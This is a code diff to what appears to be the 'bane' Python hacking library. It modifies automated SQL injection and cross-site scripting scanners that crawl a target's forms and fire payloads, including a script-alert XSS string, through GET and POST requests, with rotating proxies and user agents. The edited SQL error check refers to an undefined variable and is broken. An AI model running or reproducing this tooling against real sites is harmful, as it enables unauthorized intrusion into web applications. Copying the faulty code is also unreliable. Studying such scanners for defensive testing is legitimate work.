@@ -6,7 +6,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import bs4
 from bs4 import BeautifulSoup
 from bane.payloads import *
-from bane.pager import inputs
+from bane.pager import inputs,forms
 def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,proxy=None,cookie=None):
  '''
    this function is to test a given link to check it the target is vulnerable to SQL Injection or not by adding "'" at the end of the line and
@@ -46,10 +46,10 @@ def sqli_error_based(u,logs=True,user_agent=None,returning=False,timeout=10,prox
   print("[*]Error Based SQL Injection test")
  try:
   u+="'"
-  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout,verify=False)
-  r=rp.text
-  if (('SQL command not properly ended' in r) or ('Query failed: ERROR: syntax error at or near' in r) or ('Unclosed quotation mark before the character string' in r) or ("You have an error in your SQL syntax" in r) or ("quoted string not properly terminated" in r) or ("mysql_fetch_array(): supplied argument is not a valid MySQL result resource in"in r)):
-   s=True
+  rp= requests.get(u,headers = hea,proxies=proxy,timeout=timeout,verify=False).text
+  for x in sql_errors:
+    if x in r:
+     s=True
  except Exception as e:
   pass
  if logs==True:
@@ -173,7 +173,7 @@ def sqli_time_based(u,delay=15,db="mysql",logs=True,returning=False,timeout=25,p
    print("[+]Vulnerable!!!")
  if returning==True:
   return s
-def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
+def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False):
   '''
    this function is for xss test with GET requests.
 
@@ -201,6 +201,11 @@ def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   if extra:
    d.update(extra)
   d.update(pl)
+  if debug==True:
+   print("\n")
+   for x in d:
+    print("{} : {}".format(x,d[x]))
+   print("\n")
   try:
      c=requests.get(u, params= pl,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if  xp in c:
@@ -208,7 +213,7 @@ def xss_get(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   except Exception as e:
    pass
   return False
-def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
+def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None,debug=False):
   '''
    this function is for xss test with POST requests.
 
@@ -236,6 +241,11 @@ def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   if extra:
    d.update(extra)
   d.update(pl)
+  if debug==True:
+   print("\n")
+   for x in d:
+    print("{} : {}".format(x,d[x]))
+   print("\n")
   try:
      c=requests.post(u, data= d,headers = hea,proxies=proxy,timeout=timeout, verify=False).text
      if xp in c:
@@ -243,7 +253,7 @@ def xss_post(u,pl,user_agent=None,extra=None,timeout=10,proxy=None,cookie=None):
   except Exception as e:
    pass
   return False
-def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,proxy=None,proxies=None,timeout=10,user_agent=None,cookie=None):
+def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,proxy=None,remove_value=["..."],proxies=None,timeout=10,user_agent=None,cookie=None,debug=False):
   '''
    this function is for xss test with both POST and GET requests. it extracts the input fields names using the "inputs" function then test each input using POST and GET methods.
 
@@ -269,109 +279,120 @@ def xss(u,payload=None,fresh=False,get=True,post=True,logs=True,returning=False,
    proxy=proxy
   if proxies:
    proxy=random.choice(proxies)
-  lst=[]
+  dic={}
   if payload:
    xp=payload
   else:
    xp='<script>alert("Vulnerable!!!");</script>'
   if logs==True:
-   print("Getting parameters...")
+   print("Getting forms...")
   hu=True
-  l1=inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
-  if len(l1)==0:
+  fom=forms(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent)
+  if len(fom)==0:
    if logs==True:
-    print("No parameters were found!!!")
+    print("No forms were found!!!")
    hu=False
   if hu==True:
-   extr=[]
-   l=[]
-   for x in l1:
-    if (x.split(':')[1]!=''):
-     extr.append(x)
+   for l1 in fom:
+    lst=[]
+    u=l1['action']
+    if l1['method']=='post':
+     post=True
+     get=False
     else:
-     l.append(x)
-   for x in extr:
-    if x.split(':')[0] in l:
-     extr.remove(x)
-   if logs==True:
-    print("Test has started...\nPayload:\n"+xp)
-   if '?' in u:
-    u=u.split('?')[0].split(',')[0]
-   for i in l:
-    if stop==True:
-     break
-    user=None
-    i=i.split(':')[0]
-    try:
-     if proxies:
-      proxy=random.choice(proxies)
-     pl={i : xp}
-     extra={}
-     if len(extr)!=0:
-      for x in extr:
-       a=x.split(':')[0]
-       b=x.split(':')[1]
-       extra.update({a:b})
-     if get==True: 
-      if fresh==True:
-       if stop==True:
-        break
-       extr=[]
-       user=random.choice(ua)
-       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-       for x in k:
-        if (x.split(':')[1]!=''):
-         extr.append(x)
-       for x in extr:
-        if x.split(':')[0] in l:
-         extr.remove(x)
+     post=False
+     get=True
+    if len(inputs(u,proxy=proxy,timeout=timeout,value=True,cookie=cookie,user_agent=user_agent))>0:
+     extr=[]
+     l=[]
+     for x in l1['inputs']:
+      if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):#some websites may introduce in the input certain value that can be replaced ( because the function works only on empty inputs ) , all you have to do is put something which specify it among the others to be ingnored and inject our xss payload there !!
+       extr.append(x)
+      else:
+       l.append(x)
+     for x in extr:
+      if x.split(':')[0] in l:
+       extr.remove(x)
+     if logs==True:
+      print("\n\nURL: "+u+"\nPayload: "+xp+"\n")
+     if '?' in u:
+      u=u.split('?')[0].split(',')[0]
+     for i in l:
+      if stop==True:
+       break
+      user=None
+      i=i.split(':')[0]
+      try:
+       if proxies:
+        proxy=random.choice(proxies)
+       pl={i : xp}
        extra={}
        if len(extr)!=0:
         for x in extr:
          a=x.split(':')[0]
          b=x.split(':')[1]
          extra.update({a:b})
-      if stop==True:
+       if get==True: 
+        if fresh==True:
+         if stop==True:
+          break
+         extr=[]
+         user=random.choice(ua)
+         k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
+         for x in k:
+          if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):
+           extr.append(x)
+         for x in extr:
+          if x.split(':')[0] in l:
+           extr.remove(x)
+         extra={}
+         if len(extr)!=0:
+          for x in extr:
+           a=x.split(':')[0]
+           b=x.split(':')[1]
+           extra.update({a:b})
+        if stop==True:
+         break
+        if xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug)==True:
+          x="parameter: '"+i+"' method: 'GET' => [+]Payload was found"
+        else:
+         x="parameter: '"+i+"' method: 'GET' => [-]Payload was not found"
+        lst.append(x)
+        if logs==True:
+         print (x)
+       if post==True:
+        if fresh==True:
+         if stop==True:
+          break
+         extr=[]
+         user=random.choice(ua)
+         k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
+         for x in k:
+          if ((x.split(':')[1]!='') and (not any(s in x.split(':')[1] for s in remove_value))):
+           extr.append(x)
+         for x in extr:
+          if x.split(':')[0] in l:
+           extr.remove(x)
+         extra={}
+         if len(extr)!=0:
+          for x in extr:
+           a=x.split(':')[0]
+           b=x.split(':')[1]
+           extra.update({a:b})
+        if stop==True:
+         break
+        if xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie,debug=debug)==True:
+        	x="parameter: '"+i+"' method: 'POST' => [+]Payload was found"
+        else:
+         x="parameter: '"+i+"' method: 'POST' =>  [-]Payload was not found"
+        lst.append(x)
+        if logs==True:
+         print (x)
+      except:
        break
-      if xss_get(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie)==True:
-         x="parameter: "+i+" method: GET=> [+]Payload was found"
-      else:
-       x="parameter: "+i+" method: GET=> [-]Payload was not found"
-      lst.append(x)
-      if logs==True:
-       print (x)
-     if post==True:
-      if fresh==True:
-       if stop==True:
-        break
-       extr=[]
-       user=random.choice(ua)
-       k=inputs(u,user_agent=user,proxy=proxy,timeout=timeout,value=True,cookie=cookie)
-       for x in k:
-        if (x.split(':')[1]!=''):
-         extr.append(x)
-       for x in extr:
-        if x.split(':')[0] in l:
-         extr.remove(x)
-       extra={}
-       if len(extr)!=0:
-        for x in extr:
-         a=x.split(':')[0]
-         b=x.split(':')[1]
-         extra.update({a:b})
-      if stop==True:
-       break
-      if xss_post(u,pl,user_agent=user,extra=extra,proxy=proxy,timeout=timeout,cookie=cookie)==True:
-      	x="parameter: "+i+" method: POST=> [+]Payload was found"
-      else:
-       x="parameter: "+i+" method: POST=> [-]Payload was not found"
-      lst.append(x)
-      if logs==True:
-       print (x)
-    except:
-     break
+    dic.update({u:lst}) 
    if returning==True:
-    return lst
+    return dic
 def command_exec_link(u,timeout=10,proxy=None,logs=True,returning=False,user_agent=None,cookie=None):
  '''
    this function is for command execution test using a given link
